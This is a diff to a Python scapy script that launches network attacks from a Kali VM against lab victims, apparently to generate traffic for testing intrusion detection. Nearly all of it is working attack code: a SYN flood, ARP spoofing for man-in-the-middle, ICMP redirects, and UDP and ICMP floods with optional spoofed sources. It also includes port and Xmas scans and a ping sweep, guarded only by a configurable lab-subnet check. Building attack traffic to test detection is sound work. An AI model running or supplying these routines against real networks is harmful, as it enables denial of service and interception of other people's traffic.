@@ -1,8 +1,8 @@
 """
 attacker.py — Run on the Kali Linux VM (as root)
 =================================================
-Launches network attacks against the Windows victim VM.
-No agent needed on Kali — this just attacks.
+Launches network attacks against the selected victim VM.
+Windows is the default target, but TARGET_IP can point to the Ubuntu lab host too.
 
 Usage:
     pip install scapy
@@ -18,11 +18,12 @@ import sys
 import threading
 import os
 import ipaddress
+import subprocess
 
 try:
     from scapy.all import (
-        IP, TCP, ARP, Ether, ICMP,
-        send, sendp, srp, get_if_hwaddr,
+        IP, TCP, UDP, ARP, Ether, ICMP,
+        send, sendp, srp, sr1, get_if_hwaddr,
         RandIP, RandShort, getmacbyip, conf, get_if_list, get_if_addr
     )
 except ImportError:
@@ -36,6 +37,43 @@ VICTIM_PORT  = 80                 # Port to SYN flood
 INTERFACE    = "eth0"             # Kali network interface (auto-detected if possible)
 USE_SPOOFED_SRC = os.environ.get("USE_SPOOFED_SRC", "false").lower() in {"1", "true", "yes"}
 SYN_FLOOD_PPS = int(os.environ.get("SYN_FLOOD_PPS", "50"))  # Packets per second (tunable; default 50)
+LAB_SUBNET = os.environ.get("LAB_SUBNET", "192.168.56.0/24")
+
+
+def _ip_in_lab_subnet(ip_str):
+    try:
+        return ipaddress.ip_address(ip_str) in ipaddress.ip_network(LAB_SUBNET, strict=False)
+    except Exception:
+        return False
+
+
+def _is_target_live(ip_str):
+    try:
+        result = subprocess.run([
+            "ping", "-c", "1", "-W", "1", ip_str
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
+        if result.returncode == 0:
+            return True
+    except Exception:
+        pass
+
+    try:
+        return bool(getmacbyip(ip_str))
+    except Exception:
+        return False
+
+
+def _ensure_target_ready(ip_str, label="Target"):
+    if not ip_str:
+        print(f"[!] {label} IP is required")
+        return False
+    if not _ip_in_lab_subnet(ip_str):
+        print(f"[!] {label} {ip_str} is outside the allowed lab subnet {LAB_SUBNET}")
+        return False
+    if not _is_target_live(ip_str):
+        print(f"[!] {label} {ip_str} did not answer reachability checks")
+        return False
+    return True
 def _detect_iface():
     try:
         for name in get_if_list():
@@ -59,6 +97,9 @@ def syn_flood(stop_event):
     The victim's SYN_RECV backlog fills up, making the port unresponsive.
     Throttled to SYN_FLOOD_PPS packets per second to avoid overwhelming the backend.
     """
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+
     iface = _detect_iface()
     print(f"[*] SYN Flood started → {VICTIM_IP}:{VICTIM_PORT} on {iface}")
     print(f"[*] Rate limit: {SYN_FLOOD_PPS} pkt/s (set SYN_FLOOD_PPS env var to change)")
@@ -92,6 +133,9 @@ def arp_spoof(stop_event):
       - Tells gateway: "Victim IP is at MY MAC"
     All traffic between them now passes through Kali (MITM).
     """
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+
     print(f"[*] Resolving MACs...")
     iface = _detect_iface()
     victim_mac  = getmacbyip(VICTIM_IP)
@@ -147,8 +191,11 @@ def icmp_redirect(stop_event):
     to come from the gateway, instructing the victim to route traffic
     for 8.8.8.8 through Kali instead of the real gateway.
     """
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+
     iface = _detect_iface()
-    my_ip = conf.iface.ip if hasattr(conf.iface, 'ip') else "192.168.56.10"
+    my_ip = get_if_addr(iface)
     print(f"[*] ICMP Redirect started → telling {VICTIM_IP} to route via {my_ip} on {iface}")
     count = 0
 
@@ -168,12 +215,125 @@ def icmp_redirect(stop_event):
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 4 — TCP port scan (SYN) — exercises port_sweep / host_sweep detection
+# ─────────────────────────────────────────────────────────────────────────────
+def port_scan(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    ports = list(range(1, 1025))
+    print(f"[*] SYN port scan → {VICTIM_IP} (ports 1-1024) on {iface}")
+    sent = 0
+    for port in ports:
+        if stop_event.is_set():
+            break
+        send(IP(src=attacker_ip, dst=VICTIM_IP) / TCP(sport=RandShort(), dport=port, flags="S"),
+             verbose=False, iface=iface)
+        sent += 1
+        print(f"  [SCAN] probed {sent} ports", end="\r")
+        time.sleep(0.01)
+    print(f"\n[*] Port scan stopped — {sent} ports probed")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 5 — Xmas scan (FIN+PSH+URG) — exercises stealth_scan detection
+# ─────────────────────────────────────────────────────────────────────────────
+def xmas_scan(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    print(f"[*] Xmas scan (FIN/PSH/URG) → {VICTIM_IP} on {iface}")
+    sent = 0
+    for port in range(1, 513):
+        if stop_event.is_set():
+            break
+        send(IP(src=attacker_ip, dst=VICTIM_IP) / TCP(sport=RandShort(), dport=port, flags="FPU"),
+             verbose=False, iface=iface)
+        sent += 1
+        print(f"  [XMAS] sent {sent}", end="\r")
+        time.sleep(0.01)
+    print(f"\n[*] Xmas scan stopped — {sent} packets")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 6 — UDP flood — exercises udp_flood detection
+# ─────────────────────────────────────────────────────────────────────────────
+def udp_flood(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    dport = int(os.environ.get("UDP_FLOOD_PORT", "53"))
+    pps = int(os.environ.get("UDP_FLOOD_PPS", "100"))
+    burst = max(1, pps // 10)
+    print(f"[*] UDP flood → {VICTIM_IP}:{dport} on {iface} ({pps} pkt/s)")
+    total = 0
+    while not stop_event.is_set():
+        pkts = [IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
+                UDP(sport=RandShort(), dport=dport) / (b"X" * 64) for _ in range(burst)]
+        send(pkts, verbose=False, iface=iface)
+        total += burst
+        print(f"  [UDP] sent {total:,}", end="\r")
+        time.sleep(burst / max(1, pps))
+    print(f"\n[*] UDP flood stopped — {total:,} datagrams")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 7 — ICMP flood — exercises icmp_flood detection
+# ─────────────────────────────────────────────────────────────────────────────
+def icmp_flood(stop_event):
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        return
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    pps = int(os.environ.get("ICMP_FLOOD_PPS", "100"))
+    burst = max(1, pps // 10)
+    print(f"[*] ICMP flood → {VICTIM_IP} on {iface} ({pps} pkt/s)")
+    total = 0
+    while not stop_event.is_set():
+        pkts = [IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
+                ICMP() / (b"X" * 56) for _ in range(burst)]
+        send(pkts, verbose=False, iface=iface)
+        total += burst
+        print(f"  [ICMP] sent {total:,}", end="\r")
+        time.sleep(burst / max(1, pps))
+    print(f"\n[*] ICMP flood stopped — {total:,} packets")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Attack 8 — Ping sweep — exercises ping_sweep / host discovery detection
+# ─────────────────────────────────────────────────────────────────────────────
+def ping_sweep(stop_event):
+    iface = _detect_iface()
+    attacker_ip = get_if_addr(iface)
+    net = ipaddress.ip_network(LAB_SUBNET, strict=False)
+    print(f"[*] Ping sweep across {LAB_SUBNET} on {iface}")
+    sent = 0
+    for host in net.hosts():
+        if stop_event.is_set():
+            break
+        send(IP(src=attacker_ip, dst=str(host)) / ICMP(), verbose=False, iface=iface)
+        sent += 1
+        print(f"  [SWEEP] pinged {sent} hosts", end="\r")
+        time.sleep(0.02)
+    print(f"\n[*] Ping sweep stopped — {sent} hosts")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Menu
 # ─────────────────────────────────────────────────────────────────────────────
 ATTACKS = {
-    "1": ("SYN Flood",     syn_flood),
-    "2": ("ARP Spoofing",  arp_spoof),
-    "3": ("ICMP Redirect", icmp_redirect),
+    "1": ("SYN Flood",      syn_flood),
+    "2": ("ARP Spoofing",   arp_spoof),
+    "3": ("ICMP Redirect",  icmp_redirect),
+    "4": ("TCP Port Scan",  port_scan),
+    "5": ("Xmas Scan",      xmas_scan),
+    "6": ("UDP Flood",      udp_flood),
+    "7": ("ICMP Flood",     icmp_flood),
+    "8": ("Ping Sweep",     ping_sweep),
 }
 
 def main():
@@ -199,6 +359,9 @@ def main():
 
     # Set the global VICTIM_IP to the chosen target
     VICTIM_IP = target
+
+    if not _ensure_target_ready(VICTIM_IP, "Target"):
+        sys.exit(1)
 
     print(f"  Victim  : {VICTIM_IP}")
     print(f"  Gateway : {GATEWAY_IP}")
